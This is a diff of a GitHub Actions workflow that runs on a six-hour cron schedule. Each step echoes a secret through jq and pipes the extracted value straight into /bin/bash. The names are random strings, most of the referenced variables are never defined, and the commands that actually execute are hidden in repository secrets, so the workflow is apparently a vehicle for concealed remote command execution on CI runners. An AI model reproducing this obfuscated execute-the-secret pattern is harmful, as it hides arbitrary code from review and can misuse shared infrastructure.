@@ -3,32 +3,20 @@ name: sunli19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 5/6 * * *'
+    - cron: '17 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: sunli19871010
         env:
-          jkxb21: ${{ secrets.jkxb21 }}
+          byr83: ${{ secrets.byr83 }}
         run: |
-          echo $jkxb21 | jq -r .ob435 | /bin/bash
-          echo $q19 | jq -r .cakl146 | /bin/bash
-          echo $fwwq84426 | jq -r .wzfj13 | /bin/bash
-          echo $qydsd617 | jq -r .cxw53439 | /bin/bash
-          echo $b9 | jq -r .fvq8 | /bin/bash
-          echo $kc7 | jq -r .smx19 | /bin/bash
-          echo $r92 | jq -r .msby1 | /bin/bash
-          echo $haxj9782 | jq -r .yvr11717 | /bin/bash
-          echo $l2 | jq -r .pbcpy2118 | /bin/bash
-          echo $xgvea230 | jq -r .ciud90027 | /bin/bash
-          echo $uawsv98059 | jq -r .cbbkw326 | /bin/bash
-          echo $dwcxo2 | jq -r .aoff4031 | /bin/bash
-          echo $gp9775 | jq -r .xevp9683 | /bin/bash
-          echo $pwyx1 | jq -r .sjg7 | /bin/bash
-          echo $hk3 | jq -r .cbs96 | /bin/bash
-          echo $ix35 | jq -r .jfaws09440 | /bin/bash
-          echo $yekn5 | jq -r .su0341 | /bin/bash
+          echo $byr83 | jq -r .tc32 | /bin/bash
+          echo $vhasc74 | jq -r .eeciu8 | /bin/bash
+          echo $gksc8 | jq -r .lfvd08 | /bin/bash
+          echo $afv8 | jq -r .idz90394 | /bin/bash
+          echo $ebtwe6 | jq -r .gnaar063 | /bin/bash
 
